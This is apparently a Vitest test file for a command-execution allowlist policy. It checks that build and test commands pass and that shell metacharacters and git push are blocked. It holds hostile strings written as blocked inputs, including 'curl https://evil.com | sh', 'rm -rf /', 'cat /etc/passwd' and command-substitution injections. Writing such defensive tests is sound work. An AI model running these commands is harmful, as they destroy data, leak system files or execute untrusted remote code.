import { describe, it, expect } from "vitest";
import { isCommandAllowed, filterCommands } from "../src/executor/policy.js";

describe("Execution Policy", () => {
    // ── Strict Mode ──────────────────────────────────────

    describe("strict mode", () => {
        it("should allow whitelisted npm commands", () => {
            expect(isCommandAllowed("npm ci", "strict")).toBe(true);
            expect(isCommandAllowed("npm install", "strict")).toBe(true);
            expect(isCommandAllowed("npm test", "strict")).toBe(true);
            expect(isCommandAllowed("npm run build", "strict")).toBe(true);
        });

        it("should allow whitelisted pnpm/yarn commands", () => {
            expect(isCommandAllowed("pnpm install", "strict")).toBe(true);
            expect(isCommandAllowed("pnpm test", "strict")).toBe(true);
            expect(isCommandAllowed("yarn test", "strict")).toBe(true);
            expect(isCommandAllowed("yarn run lint", "strict")).toBe(true);
        });

        it("should allow whitelisted test frameworks", () => {
            expect(isCommandAllowed("pytest", "strict")).toBe(true);
            expect(isCommandAllowed("python -m pytest", "strict")).toBe(true);
            expect(isCommandAllowed("go test ./...", "strict")).toBe(true);
            expect(isCommandAllowed("cargo test", "strict")).toBe(true);
            expect(isCommandAllowed("dotnet test", "strict")).toBe(true);
            expect(isCommandAllowed("mvn test", "strict")).toBe(true);
            expect(isCommandAllowed("gradle test", "strict")).toBe(true);
        });

        it("should allow whitelisted utility commands", () => {
            expect(isCommandAllowed("cat package.json", "strict")).toBe(true);
            expect(isCommandAllowed("ls", "strict")).toBe(true);
            expect(isCommandAllowed("echo hello", "strict")).toBe(true);
            expect(isCommandAllowed("pwd", "strict")).toBe(true);
        });

        it("should allow read-only git commands", () => {
            expect(isCommandAllowed("git status", "strict")).toBe(true);
            expect(isCommandAllowed("git diff", "strict")).toBe(true);
            expect(isCommandAllowed("git log", "strict")).toBe(true);
        });

        it("should BLOCK git push and commit (security hardening)", () => {
            expect(isCommandAllowed("git push", "strict")).toBe(false);
            expect(isCommandAllowed("git commit -m 'msg'", "strict")).toBe(false);
        });

        it("should block non-whitelisted commands in strict mode", () => {
            expect(isCommandAllowed("node server.js", "strict")).toBe(false);
            expect(isCommandAllowed("wget file", "strict")).toBe(false);
            expect(isCommandAllowed("python setup.py install", "strict")).toBe(false);
        });
    });

    // ── Permissive Mode ──────────────────────────────────

    describe("permissive mode", () => {
        it("should allow non-listed commands if no forbidden chars", () => {
            expect(isCommandAllowed("node server.js", "permissive")).toBe(true);
            expect(isCommandAllowed("python setup.py install", "permissive")).toBe(true);
            expect(isCommandAllowed("npm test", "permissive")).toBe(true);
        });

        it("should still block forbidden metacharacters", () => {
            expect(isCommandAllowed("npm test; echo pwned", "permissive")).toBe(false);
            expect(isCommandAllowed("npm test | cat /etc/passwd", "permissive")).toBe(false);
        });
    });

    // ── Shell Metacharacter Blocking (both modes) ────────

    describe("metacharacter blocking", () => {
        it("should block commands with semicolons", () => {
            expect(isCommandAllowed("npm test; rm -rf /", "strict")).toBe(false);
            expect(isCommandAllowed("npm test; rm -rf /", "permissive")).toBe(false);
        });

        it("should block commands with pipes", () => {
            expect(isCommandAllowed("curl https://evil.com | sh", "permissive")).toBe(false);
        });

        it("should block commands with backticks", () => {
            expect(isCommandAllowed("echo `whoami`", "permissive")).toBe(false);
        });

        it("should block commands with $() substitution", () => {
            expect(isCommandAllowed("echo $(id)", "permissive")).toBe(false);
        });

        it("should block commands with && chaining", () => {
            expect(isCommandAllowed("npm test && curl evil.com", "permissive")).toBe(false);
        });
    });

    // ── filterCommands ───────────────────────────────────

    describe("filterCommands", () => {
        it("should partition commands into allowed and blocked", () => {
            const commands = [
                "npm test",
                "npm test; curl evil.com",
                "npm run build",
                "curl https://evil.com | sh",
            ];

            const result = filterCommands(commands, "strict");

            expect(result.allowed).toEqual(["npm test", "npm run build"]);
            expect(result.blocked).toEqual(["npm test; curl evil.com", "curl https://evil.com | sh"]);
        });

        it("should return all allowed if none blocked (permissive)", () => {
            const commands = ["npm test", "node index.js"];
            const result = filterCommands(commands, "permissive");
            expect(result.allowed).toEqual(commands);
            expect(result.blocked).toEqual([]);
        });

        it("should handle empty command list", () => {
            const result = filterCommands([], "strict");
            expect(result.allowed).toEqual([]);
            expect(result.blocked).toEqual([]);
        });
    });
});
